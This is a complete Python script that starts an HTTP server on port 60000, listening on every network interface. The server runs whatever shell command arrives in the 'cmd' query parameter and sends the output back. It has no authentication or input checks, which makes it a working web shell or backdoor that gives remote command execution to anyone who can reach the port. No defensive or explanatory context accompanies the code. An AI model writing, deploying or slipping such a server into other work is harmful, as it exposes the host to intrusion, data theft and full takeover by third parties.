from http.server import BaseHTTPRequestHandler, HTTPServer
import subprocess
import urllib.parse

class SimpleShellServer(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        command = urllib.parse.parse_qs(parsed_path.query).get('cmd', [None])[0]
        
        if command:
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"<pre>" + output + b"</pre>")
            except subprocess.CalledProcessError as e:
                self.send_response(500)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"Error executing command: " + str(e).encode())
        else:
            self.send_response(400)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"Please provide a command using the 'cmd' parameter")

def run(server_class=HTTPServer, handler_class=SimpleShellServer, port=60000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting server on port {port}')
    httpd.serve_forever()

if __name__ == "__main__":
    run()
